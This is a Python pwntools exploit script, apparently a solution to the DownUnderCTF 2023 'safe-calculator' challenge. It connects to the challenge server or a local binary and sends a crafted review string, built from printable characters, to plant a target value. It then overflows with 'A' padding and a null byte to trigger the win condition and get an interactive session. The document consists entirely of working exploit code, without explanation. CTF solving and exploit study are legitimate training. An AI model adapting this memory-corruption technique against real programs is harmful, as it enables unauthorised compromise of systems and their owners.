#!/usr/bin/env python3

# type: ignore
# flake8: noqa

from pwn import *

elf = context.binary = ELF("./safe-calculator", checksec=False)


def start(argv=[], *a, **kw):
    nc = "nc 2023.ductf.dev 30015"
    nc = nc.split()
    host = args.HOST or nc[1]
    port = int(args.PORT or nc[2])
    if args.REMOTE:
        return remote(host, port)
    else:
        return process([elf.path] + argv, env=env, *a, **kw)


env = {}
io = start()

review = "0" * 36 + "{}" + "0" * 4 + "{}"
target = p32(0xB98C5F3700002329 >> 32)
a = " "
b = f"{chr(target[0])}"
for i in target[1:]:
    counter = ord(" ")
    while counter < i:
        temp = i - counter
        if temp < ord(" ") or temp > ord("~"):
            counter += 1
            continue
        break
    a += chr(counter)
    b += chr(temp)


io.sendlineafter(b"> ", b"2")
io.sendlineafter(b" : ", review.format(a, b).encode())
io.sendlineafter(b"> ", b"2")
io.sendlineafter(b" : ", b"A" * 36 + b"\x00")
io.sendlineafter(b"> ", b"1")

io.interactive()
